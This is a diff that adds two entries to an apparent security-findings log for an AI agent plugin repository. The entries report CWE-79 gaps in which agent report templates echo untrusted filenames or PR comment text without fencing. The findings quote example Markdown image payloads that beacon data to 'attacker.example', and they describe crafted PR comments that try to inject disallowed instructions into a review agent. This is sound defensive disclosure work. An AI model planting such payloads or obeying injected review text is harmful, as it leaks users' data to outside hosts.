@@ -2816,6 +2816,40 @@ confidence: high
 location: plugins/ievo/skills/overlay-status/SKILL.md Step 3 (summary extraction) and Step 5 (render)
 ```
 
+## S-2026-08-13-001 — deep-reviewer.md's Coverage-section coverage_caveats echo has no excerpt-containment fencing, unlike this same file's Issue:/Suggestion: fields
+
+```yaml
+id: S-2026-08-13-001
+discovered_at: 2026-08-13T07:49:16Z
+run_id: manual-research-session-2026-08-13
+target_repo: ievo-ai/skills
+title: agents/deep-reviewer.md's ### Coverage template echoes coverage_caveats verbatim with no excerpt-containment rule, unlike Issue:/Suggestion:
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/628
+cwe: CWE-79
+confidence: medium
+location: plugins/ievo/agents/deep-reviewer.md:188 (template); excerpt-containment note at :204-243 and Rules pointer at :252 both scope only to Issue:/Suggestion:
+```
+
+Working-tree-mode deep-review's `coverage_caveats` field names untracked paths skipped by the orchestrator's 50-path/256KB cap — a filename fully controlled by whoever plants the untracked file (only `/` and NUL are forbidden in a path component). The `### Coverage` template instructs echoing it verbatim, but the file's own "Excerpt containment" note and Rules-section pointer are explicitly scoped to `Issue:`/`Suggestion:` only — a crafted filename like `![x](https://attacker.example/beacon.png?d=<data>).js` renders live and unfenced in the Step 5-rendered report, including in the Claude Code chat UI. Fix: extend the existing containment note + Rules pointer to also cover the `### Coverage` section's `coverage_caveats` echo, same fencing algorithm.
+
+## S-2026-08-13-002 — review-retrospective's Coverage-section observations (refused-instruction, debug-log mention) have no excerpt-containment fencing, unlike its Findings/Title fields
+
+```yaml
+id: S-2026-08-13-002
+discovered_at: 2026-08-13T07:49:16Z
+run_id: manual-research-session-2026-08-13
+target_repo: ievo-ai/skills
+title: agents/review-retrospective.md's Coverage-section refused-instruction (:58) and debug-log-mention (:115) notes have no excerpt-containment rule, unlike Findings/Title (companion gap in skills/review-retrospective/SKILL.md Steps 3-4)
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/629
+cwe: CWE-79
+confidence: medium
+location: plugins/ievo/agents/review-retrospective.md:58, :115, :172-173 (template); excerpt-containment note at :176-231 explicitly scoped to Findings excerpt + PR-summary Title: only (lines 176-178, 219)
+```
+
+Untrusted PR review/comment/thread text that either attempts a disallowed Bash instruction or mentions a debug-log path gets "noted" in the `### Coverage` section per lines 58/115 — but this file's detailed excerpt-containment note (lines 176-231) is explicit it covers only the `Findings` symptom+evidence excerpt and the PR-summary `Title:` line, not Coverage. A crafted review/comment combining a disallowed-instruction attempt with a live Markdown image/link payload in the same quoted span lands unfenced in the Coverage section, which renders on the same two Markdown surfaces (chat UI via Step 3's "as-is" presentation, and the persisted `retrospective-pending.md` park file via Step 4) the containment note already protects for Findings/Title. Companion gap: the orchestrating `skills/review-retrospective/SKILL.md` Steps 3-4 has no containment note of its own either. Fix: extend the agent's containment note + Rules pointer to cover the Coverage section's two observation types; add or document the equivalent guarantee in the orchestrating SKILL.md.
+
 `.ievo/evolution/` is committed (not gitignored) project state per AGENTS.md/init/SKILL.md Step 10; Step 2 of this skill explicitly classifies unrecognized files under it as `Other` scope rather than rejecting them, with no provenance check that a file was actually produced by `/ievo:evo`'s own write path. Step 3 extracts a summary via a 5-item precedence (frontmatter `description:`, boilerplate subsection title, first heading, first non-blank line, raw text) with zero containment — confirmed by grep: this is the only display-oriented SKILL.md in the module with no "containment"/"backtick"/"fence" occurrences, unlike `feedback/SKILL.md`, `evo/SKILL.md` Step 4, and `deep-review/SKILL.md` Step 5. Step 5 then interpolates the raw extracted text into a Markdown list line wrapped only in double quotes, which are inert to Markdown. A planted `.ievo/evolution/*.md` file (via a malicious/compromised contributor, poisoned fork, or supply-chain-compromised postinstall step) with a summary containing `![x](https://attacker.example/beacon.png)` fires live the moment `/ievo:overlay-status` displays its report. Confidence high (straightforward, directly verified absence of any containment step). Blast radius: confidentiality low / integrity low / availability none. Recommendation: apply the same backtick-run-sizing containment pattern already used by `feedback/SKILL.md`, `evo/SKILL.md` Step 4, and `deep-review/SKILL.md` Step 5 to all five of Step 3's extraction paths before Step 5 renders them.
 
 ---
